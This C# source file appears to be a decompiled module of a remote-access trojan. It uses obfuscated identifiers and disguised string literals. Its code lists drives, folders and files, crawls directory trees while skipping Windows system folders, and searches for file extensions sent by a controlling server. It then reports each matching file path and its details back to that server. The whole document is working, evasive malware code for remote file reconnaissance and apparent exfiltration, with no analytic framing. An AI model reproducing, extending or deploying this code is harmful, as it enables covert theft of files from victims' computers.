using System;
using System.Collections.Generic;
using System.IO;

namespace aphmasnvs;

internal class DRUIVF
{
	public List<string> aphmasnvsnotFilders = new List<string>();

	public string aphmasnvsmainPath;

	public int aphmasnvssIndx = 0;

	public List<string> aphmasnvssFiles = new List<string>();

	public string aphmasnvsfilesLogs = COUNF.aphmasnvsfilesLogs;

	public int aphmasnvsfIndx = 0;

	public bool aphmasnvsreaging = false;

	public MCUDM iserver;

	public List<string> aphmasnvsfExts = new List<string>();

	public bool aphmasnvsseueAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DRUIVF()
	{
		aphmasnvsnotFilders.Add("program files|aphmasnvs".Split(new char[1] { '|' })[0]);
		aphmasnvsnotFilders.Add("system volume information|aphmasnvs".Split(new char[1] { '|' })[0]);
		aphmasnvsnotFilders.Add("documents and settings|aphmasnvs".Split(new char[1] { '|' })[0]);
		aphmasnvsnotFilders.Add("windows|aphmasnvs".Split(new char[1] { '|' })[0]);
		aphmasnvsnotFilders.Add("program files (x86)|aphmasnvs".Split(new char[1] { '|' })[0]);
		aphmasnvsnotFilders.Add("programdata|aphmasnvs".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> aphmasnvsadud_File(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.aphmasnvsautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (aphmasnvsseueAccess(text) && !aphmasnvsnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void aphmasnvslouok_File(string tempStr)
	{
		iserver.aphmasnvsautCnls = false;
		aphmasnvsfExts.Clear();
		aphmasnvssFiles.Clear();
		aphmasnvsfIndx = 0;
		aphmasnvssIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				aphmasnvsfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			aphmasnvsreaging = true;
			aphmasnvsseund_Search(array[1]);
			aphmasnvsreaging = false;
			iserver.aphmasnvspuush_data(null, "aphmasnvs-seuard=seauhed|aphmasnvs".Split(new char[1] { '|' })[0]);
		}
	}

	public string aphmasnvschueck_Folder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (aphmasnvsseueAccess(text2))
				{
					text = text + text2 + ">|aphmasnvs".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void aphmasnvsseund_Search(string path)
	{
		try
		{
			foreach (string item in aphmasnvsadud_File(path))
			{
				string extension = Path.GetExtension(item);
				if (aphmasnvsfExts.Contains(extension.ToLower()))
				{
					string text = iserver.aphmasnvsfiule_info(item, ret: true);
					iserver.aphmasnvspuush_data(null, "aphmasnvs-seuarf=|aphmasnvs".Split(new char[1] { '|' })[0] + item + "<FIULE_AUUTO<|aphmasnvs".Split(new char[1] { '|' })[0] + text);
				}
				if (iserver.aphmasnvsautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string aphmasnvslouokup_File(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|aphmasnvs".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string aphmasnvslouokup_Drive()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|aphmasnvs".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
